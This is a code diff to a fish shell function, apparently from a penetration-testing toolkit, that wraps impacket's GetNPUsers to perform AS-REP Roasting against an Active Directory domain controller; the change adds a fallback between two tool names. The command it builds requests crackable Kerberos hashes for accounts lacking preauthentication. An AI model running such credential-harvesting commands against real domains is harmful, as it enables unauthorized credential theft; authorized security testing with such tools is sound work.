@@ -52,12 +52,17 @@ function _kronos_asrep_roast --description "Run AS-REP Roasting using impacket-G
         return 1
     end
 
-    if not command -s impacket-GetNPUsers >/dev/null
-        echo "Error: impacket-GetNPUsers not found in PATH." >&2
+    set -l impacket_cmd ""
+    if command -s GetNPUsers.py >/dev/null
+        set impacket_cmd "GetNPUsers.py"
+    else if command -s impacket-GetNPUsers >/dev/null
+        set impacket_cmd "impacket-GetNPUsers"
+    else
+        echo "Error: GetNPUsers.py or impacket-GetNPUsers not found in PATH." >&2
         return 1
     end
 
-    set -l cmd_str "impacket-GetNPUsers \"$domain/$user\" -dc-ip \"$target\" -no-pass -request"
+    set -l cmd_str "$impacket_cmd \"$domain/$user\" -dc-ip \"$target\" -no-pass -request"
     if set -q _flag_kerberos
         set cmd_str "$cmd_str -k"
     end
